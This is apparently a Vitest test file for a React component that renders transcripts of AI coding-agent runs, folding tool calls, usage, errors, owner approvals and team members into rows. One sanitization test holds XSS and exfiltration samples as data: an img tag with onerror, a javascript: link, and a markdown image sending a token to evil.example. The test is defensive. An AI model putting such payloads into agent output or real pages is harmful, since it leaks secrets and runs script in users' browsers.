import { RunEvent as RunEventSchema } from '@agentome/shared';
import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import changelogRun from './fixtures/run-ee2e51b8.json';
import instructionsRun from './fixtures/run-c6fb25fe.json';
import type { RunEvent } from './run-data';
import { finalAnswer, foldTranscript, preview, Transcript, toolName, words } from './transcript';

// A run as the worker reports it (packages/shared run events): a message, two tool calls, the
// usage the CLI repeats for one message, a note, an event nobody knows, and the result.
const at = '2026-10-21T10:00:00.000Z';
const events: RunEvent[] = [
  { seq: 0, at, type: 'started', model: 'claude-sonnet-5', cliVersion: '2.1.90' },
  { seq: 1, at, type: 'assistant_message', text: 'Let me read the **manifest**.' },
  {
    seq: 2,
    at,
    type: 'tool_use',
    id: 'toolu_1',
    name: 'Read',
    input: { file_path: 'package.json' },
  },
  {
    seq: 3,
    at,
    type: 'usage',
    model: 'claude-sonnet-5',
    messageId: 'msg_1',
    tokensIn: 10,
    tokensOut: 2,
    tokensCacheRead: 0,
    tokensCacheWrite: 0,
    tokensCacheWrite1h: 0,
  },
  { seq: 4, at, type: 'tool_use', id: 'toolu_2', name: 'Bash', input: { command: 'pnpm test' } },
  {
    seq: 5,
    at,
    type: 'usage',
    model: 'claude-sonnet-5',
    messageId: 'msg_1',
    tokensIn: 2104,
    tokensOut: 138,
    tokensCacheRead: 9200,
    tokensCacheWrite: 0,
    tokensCacheWrite1h: 0,
  },
  {
    seq: 6,
    at,
    type: 'tool_result',
    toolUseId: 'toolu_1',
    output: '{ "name": "demo" }',
    isError: false,
  },
  { seq: 7, at, type: 'tool_result', toolUseId: 'toolu_2', output: '1 failed', isError: true },
  {
    seq: 8,
    at,
    type: 'error',
    code: 'rate_limited',
    message: 'The account is close to its limit.',
    fatal: false,
  },
  {
    seq: 9,
    at,
    type: 'unknown',
    rawType: 'rate_limit_event',
    raw: { type: 'rate_limit_event', rate_limit_info: { status: 'allowed' } },
  },
  { seq: 10, at, type: 'assistant_message', text: 'The package is called `demo`.' },
  { seq: 11, at, type: 'result', text: 'The package is called `demo`.', isError: false },
];

// The first live runs (Claude Code 2.1.280), as GET /api/runs/:id/events answered them:
// a commit with a heredoc message, and an answer that quotes a code block. Parsed as the server
// parses a stored event, so that a fixture the app could never receive fails here.
// Home path, user and seat renamed (/Users/maria, maria, MacBook-maria); ids as recorded.
const changelog = RunEventSchema.array().parse(changelogRun.events);
const instructions = RunEventSchema.array().parse(instructionsRun.events);

describe('foldTranscript', () => {
  it('pairs tool calls with their results and closes a turn with its usage', () => {
    // A batch sent twice and out of order changes nothing.
    const blocks = foldTranscript([...events].reverse().concat(events));
    expect(blocks.map((block) => block.kind)).toEqual([
      'event',
      'event',
      'tool',
      'tool',
      'usage',
      'event',
      'system',
      'event',
      'result',
    ]);
    expect(blocks[2]).toMatchObject({
      use: { name: 'Read' },
      result: { output: '{ "name": "demo" }' },
    });
    expect(blocks[3]).toMatchObject({ use: { name: 'Bash' }, result: { isError: true } });
    // After the turn's last call, where the message's usage was last reported.
    expect(blocks[4]).toMatchObject({ seq: 5, event: { tokensIn: 2104 } });
    expect(blocks[8]).toMatchObject({ kind: 'result', repeats: true });
  });

  it("leaves the result's totals to the cost of the run: they are not a turn", () => {
    const total: RunEvent = {
      seq: 12,
      at,
      type: 'usage',
      model: 'claude-sonnet-5',
      tokensIn: 2114,
      tokensOut: 900,
      tokensCacheRead: 9200,
      tokensCacheWrite: 0,
      tokensCacheWrite1h: 0,
      total: true,
    };
    const withTotal = foldTranscript([...events, total]);
    expect(withTotal).toEqual(foldTranscript(events));
  });

  it('folds the housekeeping of a live run where it came, and each turn ends with its usage', () => {
    const blocks = foldTranscript(changelog);
    expect(blocks.map((block) => block.kind)).toEqual([
      'event',
      'system',
      'tool',
      'usage',
      'tool',
      'tool',
      'usage',
      'system',
      'event',
      'usage',
      'result',
    ]);
    // The rate limit at the start, and the commit noticed mid-call where the call is: a fold
    // never reaches back over a call or a message.
    expect(blocks[1]).toMatchObject({ seq: 1, events: [{ rawType: 'rate_limit_event' }] });
    expect(blocks[7]).toMatchObject({ seq: 11, events: [{ rawType: 'system/vcs_state_changed' }] });
    // The second turn wrote the file and committed it: one line after both calls.
    expect(blocks[4]).toMatchObject({ use: { name: 'Write' } });
    expect(blocks[5]).toMatchObject({ use: { name: 'Bash' }, result: { isError: false } });
    expect(blocks[6]).toMatchObject({ seq: 10, event: { tokensOut: 8, tokensCacheRead: 33_412 } });
    expect(blocks[10]).toMatchObject({ kind: 'result', repeats: true });

    expect(foldTranscript(instructions)).toMatchObject([
      { kind: 'event', event: { type: 'started' } },
      { kind: 'system', events: [{}, {}, {}] },
      { kind: 'event', event: { type: 'assistant_message' } },
      { kind: 'usage', seq: 6 },
      { kind: 'result', repeats: true },
    ]);
  });

  it('keeps what reports a problem or is about the work as rows', () => {
    const unknown = (seq: number, rawType: string, raw: unknown): RunEvent => ({
      seq,
      at,
      type: 'unknown',
      rawType,
      raw,
    });
    // Lines as the worker's parser keeps them (apps/worker/src/claude/fixtures).
    const blocks = foldTranscript([
      unknown(0, 'rate_limit_event', { rate_limit_info: { status: 'allowed' } }),
      unknown(1, 'rate_limit_event', { rate_limit_info: { status: 'rejected' } }),
      unknown(2, 'system/api_retry', { subtype: 'api_retry', error_status: 529, error: 'x' }),
      unknown(3, 'system/compact_boundary', { compact_metadata: { trigger: 'auto' } }),
      unknown(4, 'assistant/tool_use', { type: 'tool_use', input: {} }),
      unknown(5, 'invalid_json', '{"type":'),
      unknown(6, 'unparsed', { type: 'tool_use', payload: {} }),
      unknown(7, 'system/thinking_tokens', 'cut short…'),
    ]);
    // A compact boundary stays after the retry it followed, not folded into the start.
    expect(blocks).toMatchObject([
      { kind: 'system', events: [{ seq: 0 }] },
      { kind: 'event', event: { seq: 1 } },
      { kind: 'event', event: { seq: 2 } },
      { kind: 'system', events: [{ seq: 3 }] },
      { kind: 'event', event: { seq: 4 } },
      { kind: 'event', event: { seq: 5 } },
      { kind: 'event', event: { seq: 6 } },
      { kind: 'system', events: [{ seq: 7 }] },
    ]);
  });

  it('keeps a result without its call, and a call still waiting for one', () => {
    const blocks = foldTranscript([
      { seq: 0, at, type: 'tool_result', toolUseId: 'toolu_x', output: 'orphan', isError: false },
      { seq: 1, at, type: 'tool_use', id: 'toolu_y', name: 'Edit', input: {} },
      { seq: 2, at, type: 'result', text: 'Something else', isError: true },
    ]);
    expect(blocks).toMatchObject([
      { kind: 'tool', result: { output: 'orphan' } },
      { kind: 'tool', use: { name: 'Edit' } },
      { kind: 'result', repeats: false },
    ]);
    expect(blocks[1]).not.toHaveProperty('result');
  });
});

describe('finalAnswer', () => {
  it('is the last message that the result repeats, as the transcript shows it', () => {
    expect(finalAnswer(changelog)).toEqual({ seq: 13, text: changelogRun.run.summary });
    expect(finalAnswer(instructions)).toEqual({ seq: 5, text: instructionsRun.run.summary });
  });

  it('is the result when it says something else, and never what came after it', () => {
    const message = (seq: number, text: string): RunEvent => ({
      seq,
      at,
      type: 'assistant_message',
      text,
    });
    const ended: RunEvent[] = [
      message(0, 'Working on it.'),
      { seq: 1, at, type: 'result', text: 'Stopped after 80 turns.', isError: true },
      message(2, 'A turn after the result.'),
    ];
    expect(finalAnswer(ended)).toEqual({ seq: 1, text: 'Stopped after 80 turns.' });
    // A result that repeats the message, or says nothing, leaves the message as the answer.
    const repeated: RunEvent[] = [
      message(0, 'Done: A'),
      { seq: 1, at, type: 'result', text: ' Done: A', isError: false },
      message(2, 'Done: B'),
    ];
    expect(finalAnswer(repeated)).toEqual({ seq: 0, text: 'Done: A' });
    const silent: RunEvent = { seq: 1, at, type: 'result', text: '', isError: true };
    expect(finalAnswer([message(0, 'Cut off'), silent])).toEqual({ seq: 0, text: 'Cut off' });
    expect(finalAnswer([])).toBeUndefined();
  });
});

describe('preview', () => {
  it('shows the argument a call is recognized by', () => {
    expect(preview({ command: 'git status', description: 'Status' })).toBe('git status');
    expect(preview({ file_path: 'README.md' })).toBe('README.md');
    expect(preview({ todos: [1] })).toBe('{"todos":[1]}');
    expect(preview('raw text')).toBe('raw text');
  });
});

describe('Transcript', () => {
  it('renders messages as markdown, tool calls folded, usage, notes and the result', async () => {
    const user = userEvent.setup();
    render(<Transcript events={events} live={false} />);
    expect(screen.getByText('Claude Code 2.1.90 started', { exact: false })).toBeTruthy();
    expect(screen.getByText('manifest').tagName).toBe('STRONG');
    // Tokens are inside the call that ended the turn, not on the page.
    expect(screen.queryByText(/2.1K tokens in/)).toBeNull();
    expect(screen.getByText('The account is close to its limit.', { exact: false })).toBeTruthy();
    // The result repeats the last message: shown once, with the end of the run.
    expect(screen.getAllByText('demo')).toHaveLength(1);
    expect(screen.getByText('Claude Code finished')).toBeTruthy();

    // The calls between two messages are one row, saying what they were, which opens to each.
    const steps = screen.getByRole('button', { name: /^2 steps: 1 file read, 1 command/ });
    expect(within(steps).getByText('1 failed')).toBeTruthy();
    expect(screen.queryByRole('button', { name: /^Ran pnpm test/ })).toBeNull();
    await user.click(steps);
    const bash = screen.getByRole('button', { name: /^Ran pnpm test/ });
    expect(bash.getAttribute('aria-expanded')).toBe('false');
    expect(within(bash).getByText('Error')).toBeTruthy();
    expect(screen.queryByLabelText('Output of Bash')).toBeNull();
    await user.click(bash);
    expect(bash.getAttribute('aria-expanded')).toBe('true');
    // The tool's name and the turn's tokens open with the row (one or two output tokens).
    expect(screen.getByText(/2.1K tokens in, 9.2K cache read/).textContent).toBe(
      'Bash · 2.1K tokens in, 9.2K cache read',
    );
    // A command is text, under its description or "Command"; other tools keep their JSON.
    expect(screen.getByText('Command')).toBeTruthy();
    expect(screen.getByLabelText('Command of Bash').textContent).toBe('pnpm test');
    expect(screen.getByLabelText('Output of Bash').textContent).toBe('1 failed');
    await user.click(screen.getByRole('button', { name: /^Read package.json/ }));
    expect(screen.getByLabelText('Input of Read').textContent).toBe(
      '{\n  "file_path": "package.json"\n}',
    );

    expect(screen.queryByRole('button', { name: 'rate_limit_event' })).toBeNull();
    await user.click(screen.getByRole('button', { name: '1 system event' }));
    await user.click(screen.getByRole('button', { name: 'rate_limit_event' }));
    expect(screen.getByLabelText('Event rate_limit_event').textContent).toContain('"allowed"');
  });

  it('says a failed step quietly in a run that ended done, and in red in any other', async () => {
    const user = userEvent.setup();
    const { rerender } = render(<Transcript events={events} live={false} />);
    const steps = () => screen.getByRole('button', { name: /^2 steps/ });
    // Going, failed or cancelled: the failing step is what one looks for.
    expect(within(steps()).getByText('1 failed').className).toContain('text-failed');

    rerender(<Transcript events={events} live={false} settled />);
    expect(within(steps()).getByText('1 failed').className).toContain('text-ink-3');
    expect(steps().querySelector('svg.text-failed')).toBeNull();
    await user.click(steps());
    const bash = screen.getByRole('button', { name: /^Ran pnpm test/ });
    expect(within(bash).getByText('Error').className).toContain('text-ink-3');
    expect(bash.querySelector('svg.text-failed')).toBeNull();
  });

  it('shows a live run without housekeeping rows, a footnote per turn and the final answer', async () => {
    const user = userEvent.setup();
    render(<Transcript events={changelog} live={false} answerAbove={13} />);
    // A run with nothing to say between its calls is one row of them.
    expect(screen.getAllByRole('button').map((row) => row.textContent)).toEqual([
      '3 steps: 2 commands, 1 file changed ',
    ]);
    await user.click(screen.getByRole('button', { name: /^3 steps/ }));
    const rows = screen.getAllByRole('button').map((row) => row.textContent);
    expect(rows).toEqual([
      '3 steps: 2 commands, 1 file changed ',
      '1 system event',
      // Claude Code's own description of a command leads; the command is the thing.
      expect.stringMatching(/^Inspect empty repository state git status/),
      // A path in the run's workspace reads from the repository.
      'Wrote CHANGELOG.md ',
      expect.stringMatching(
        /^Commit the changelog git add CHANGELOG.md && git commit -m "\$\(cat <<'EOF'/,
      ),
      '1 system event',
    ]);
    // Tokens stay inside the rows.
    expect(screen.queryAllByText(/ tokens in, /)).toHaveLength(0);
    const [, afterCommit] = screen.getAllByRole('button', { name: '1 system event' });
    await user.click(afterCommit as HTMLElement);
    expect(screen.getByRole('button', { name: 'system/vcs_state_changed' })).toBeTruthy();
    // The heredoc commit reads as it was written, under the call's description.
    await user.click(screen.getByRole('button', { name: /^Commit the changelog git add/ }));
    expect(screen.getByText(/33.4K cache read, 301 cache write/).textContent).toBe(
      'Bash · 2 tokens in, 33.4K cache read, 301 cache write',
    );
    const command = screen.getByLabelText('Command of Bash').textContent ?? '';
    expect(command).toContain("$(cat <<'EOF'\nAdd CHANGELOG.md in Keep a Changelog format\n\n");
    expect(command).not.toContain('\\n');
    // The answer heads the page under Result: here, a line that points there.
    expect(screen.getByRole('link', { name: 'Result' }).getAttribute('href')).toBe('#final-answer');
    expect(screen.queryByText(/^I created CHANGELOG.md in Keep a Changelog/)).toBeNull();
  });

  it('keeps one call its own row, a call waiting for the owner in view, and a live run open', () => {
    const bash = (seq: number, command: string): RunEvent => ({
      seq,
      at,
      type: 'tool_use',
      id: `t${seq}`,
      name: 'Bash',
      input: { command },
    });
    const done = (seq: number): RunEvent => ({
      seq: seq + 1,
      at,
      type: 'tool_result',
      toolUseId: `t${seq}`,
      output: 'ok',
      isError: false,
    });
    const ask: RunEvent = {
      seq: 20,
      at,
      type: 'tool_use',
      id: 't20',
      name: 'mcp__agentome__ask_owner',
      input: { question: 'Open the MR?' },
    };
    const events: RunEvent[] = [
      bash(0, 'git status'),
      done(0),
      { seq: 5, at, type: 'assistant_message', text: 'Two more.' },
      bash(6, 'pnpm i'),
      done(6),
      bash(8, 'pnpm test'),
      done(8),
      ask,
    ];
    const question = {
      tool: 'ask_owner',
      decision: 'pending' as const,
      reason: null,
      decidedBy: null,
      createdAt: at,
    };
    const { rerender } = render(<Transcript events={events} live={false} toolCalls={[question]} />);
    expect(screen.getAllByRole('button').map((row) => row.textContent)).toEqual([
      'Ran git status ',
      '2 commands ',
      expect.stringMatching(/^Used ask_owner/),
    ]);
    expect(screen.getByText("Waiting for the owner's approval")).toBeTruthy();
    // Live, the newest calls stay open until the person closes them.
    rerender(<Transcript events={events.slice(0, 7)} live toolCalls={[]} />);
    const newest = screen.getByRole('button', { name: /^2 commands/ });
    expect(newest.getAttribute('aria-expanded')).toBe('true');
  });

  it('says a plan and a tool search in words', () => {
    expect(words({ name: 'TaskCreate', input: { subject: 'Open the MR' } })).toMatchObject({
      verb: 'Added to its plan',
      object: 'Open the MR',
    });
    expect(words({ name: 'TaskUpdate', input: { taskId: '1' } }).verb).toBe('Updated its plan');
    expect(words({ name: 'ToolSearch', input: { query: 'select:TaskCreate' } }).verb).toBe(
      'Loaded tools',
    );
  });

  it('marks a call without a result as running while the run is live', () => {
    const call: RunEvent = { seq: 0, at, type: 'tool_use', id: 't', name: 'Edit', input: {} };
    const { rerender } = render(<Transcript events={[call]} live />);
    expect(within(screen.getByRole('button')).getByText('Running')).toBeTruthy();
    rerender(<Transcript events={[call]} live={false} />);
    expect(within(screen.getByRole('button')).getByText('No result')).toBeTruthy();
  });

  it('shows a fatal error as the end of the run, and a cancel as a cancel', () => {
    render(
      <Transcript
        live={false}
        events={[
          {
            seq: 0,
            at,
            type: 'error',
            code: 'orphaned',
            message: 'The computer went quiet.',
            fatal: true,
          },
          {
            seq: 1,
            at,
            type: 'error',
            code: 'cancelled',
            message: 'Cancelled by its owner.',
            fatal: true,
          },
        ]}
      />,
    );
    expect(screen.getByText('The computer went quiet.').className).toContain('text-failed');
    expect(screen.getByText('orphaned').tagName).toBe('CODE');
    expect(screen.getByText('Cancelled by its owner.').className).not.toContain('text-failed');
  });

  it('shows what else a Bash call set, and survives an anchor that does not decode', async () => {
    const user = userEvent.setup();
    const events: RunEvent[] = [
      {
        seq: 0,
        at,
        type: 'tool_use',
        id: 'toolu_bg',
        name: 'Bash',
        input: { command: 'pnpm test', run_in_background: true, timeout: 600000 },
      },
      { seq: 1, at, type: 'assistant_message', text: 'Done [see](#100%) and [top](#).' },
    ];
    render(<Transcript events={events} live={false} />);
    await user.click(screen.getByRole('button', { name: /^Ran pnpm test/ }));
    expect(screen.getByLabelText('Options of Bash').textContent).toBe(
      '{\n  "run_in_background": true,\n  "timeout": 600000\n}',
    );
    // Neither names an element: the browser gets the click, and the page stays whole.
    await user.click(screen.getByRole('link', { name: 'see' }));
    expect(screen.getByRole('link', { name: 'top' })).toBeTruthy();
    expect(window.location.hash).toBe('#100%25');
    // jsdom keeps the location between tests.
    window.history.replaceState(null, '', window.location.pathname);
  });

  it('takes a footnote to its note in place, without a jump the router cannot hold', async () => {
    const user = userEvent.setup();
    const text = 'The tests pass[^1].\n\n[^1]: On Node 22 only.';
    render(<Transcript events={[{ seq: 0, at, type: 'assistant_message', text }]} live={false} />);
    const reference = screen.getByRole('link', { name: '1' });
    expect(reference.getAttribute('href')).toBe('#user-content-fn-1');
    await user.click(reference);
    const note = document.getElementById('user-content-fn-1');
    expect(document.activeElement).toBe(note);
    expect(window.location.hash).toBe('');
    // And back from the note to where it was referenced.
    await user.click(within(note as HTMLElement).getByRole('link'));
    expect(document.activeElement?.id).toBe('user-content-fnref-1');
    expect(window.location.hash).toBe('');
  });

  it('never renders the HTML, scripts or images an agent writes', () => {
    const text = [
      'Look: <img src="https://evil.example/x.png" onerror="alert(1)"> and <b>bold</b>.',
      '[click](javascript:alert(1)) [docs](https://example.com/docs) [local](README.md)',
      '[inside](https:/api/runs) [schemeless](//evil.example/x)',
      '![secret](https://evil.example/?leak=token) A note.[^1]',
      '[^1]: Footnotes link within the page.',
    ].join('\n\n');
    const { container } = render(
      <Transcript live={false} events={[{ seq: 0, at, type: 'assistant_message', text }]} />,
    );
    expect(container.querySelector('img, b, script')).toBeNull();
    expect(container.textContent).toContain('<b>bold</b>');
    expect(container.textContent).toContain('[secret]');
    const links = [...container.querySelectorAll('a')];
    expect(links.map((link) => link.getAttribute('href'))).toEqual([
      'https://example.com/docs',
      '#user-content-fn-1',
      '#user-content-fnref-1',
    ]);
    // Out of the page in a tab of its own; within it, in place.
    expect(links.map((link) => link.getAttribute('target'))).toEqual(['_blank', null, null]);
    expect(links[1]?.id).toBe('user-content-fnref-1');
    for (const text of ['click', 'local', 'inside', 'schemeless']) {
      expect(screen.getByText(text).tagName).toBe('SPAN');
    }
  });
});

describe('toolName', () => {
  it("names the gateway's tools as its catalog does, and leaves the CLI's own alone", () => {
    expect(toolName('mcp__agentome__code_host_open_change_request')).toBe(
      'code_host.open_change_request',
    );
    expect(toolName('mcp__agentome-qa__memory_write')).toBe('memory_write');
    expect(toolName('Bash')).toBe('Bash');
  });
});

describe('a team run', () => {
  const team = [
    { key: 'qa', agentId: '7f3a9c21-0000-4000-8000-0000000000a1', name: 'QA engineer' },
  ];
  const lead = 'toolu_lead';
  const teamEvents: RunEvent[] = [
    {
      seq: 0,
      at,
      type: 'tool_use',
      id: lead,
      name: 'Agent',
      input: { subagent_type: 'qa', description: 'Test the refund screen', prompt: 'Run the e2e.' },
    },
    { seq: 1, at, type: 'assistant_message', text: 'Running it.', parentToolUseId: lead },
    {
      seq: 2,
      at,
      type: 'tool_use',
      id: 'toolu_m',
      name: 'mcp__agentome-qa__memory_write',
      input: { path: 'MEMORY.md' },
      parentToolUseId: lead,
    },
    {
      seq: 3,
      at,
      type: 'tool_result',
      toolUseId: 'toolu_m',
      output: 'Saved',
      isError: false,
      parentToolUseId: lead,
    },
    { seq: 4, at, type: 'assistant_message', text: 'All green.', parentToolUseId: lead },
    { seq: 5, at, type: 'tool_result', toolUseId: lead, output: 'All green.', isError: false },
    { seq: 6, at, type: 'assistant_message', text: 'QA says all green.' },
  ];

  it("puts a member's events under the lead's assignment", () => {
    const blocks = foldTranscript(teamEvents);
    expect(blocks.map((block) => block.kind)).toEqual(['tool', 'event']);
    expect(blocks[0]).toMatchObject({ result: { seq: 5 } });
    expect((blocks[0] as { children: RunEvent[] }).children.map((event) => event.seq)).toEqual([
      1, 2, 3, 4,
    ]);
  });

  it('names the member, counts its steps and opens to its own transcript', async () => {
    const user = userEvent.setup();
    const calls = [
      {
        tool: 'memory_write',
        agentId: team[0]?.agentId,
        decision: 'pending' as const,
        reason: null,
        decidedBy: null,
        createdAt: at,
      },
    ];
    render(<Transcript events={teamEvents} live team={team} toolCalls={calls} />);
    const row = screen.getByRole('button', { name: /QA engineer Test the refund screen 1 step/ });
    await user.click(row);
    expect(screen.getByLabelText('Assignment of QA engineer').textContent).toBe('Run the e2e.');
    expect(screen.getByText('All green.')).toBeTruthy();
    // The member's gateway call has its own decision under it.
    expect(screen.getByText("Waiting for the owner's approval")).toBeTruthy();
  });

  it('says an assignment waits while its step waits for the owner', () => {
    const step = {
      tool: 'team_step',
      agentId: '7f3a9c21-0000-4000-8000-0000000000ff',
      decision: 'pending' as const,
      reason: null,
      decidedBy: null,
      createdAt: at,
      members: [team[0]?.agentId ?? ''],
    };
    const held = teamEvents.slice(0, 1);
    const { rerender } = render(<Transcript events={held} live team={team} toolCalls={[step]} />);
    expect(screen.getByRole('button', { name: /QA engineer.*Waiting for approval/ })).toBeTruthy();
    rerender(
      <Transcript events={held} live team={team} toolCalls={[{ ...step, decision: 'approved' }]} />,
    );
    expect(screen.queryByText('Waiting for approval')).toBeNull();
  });
});
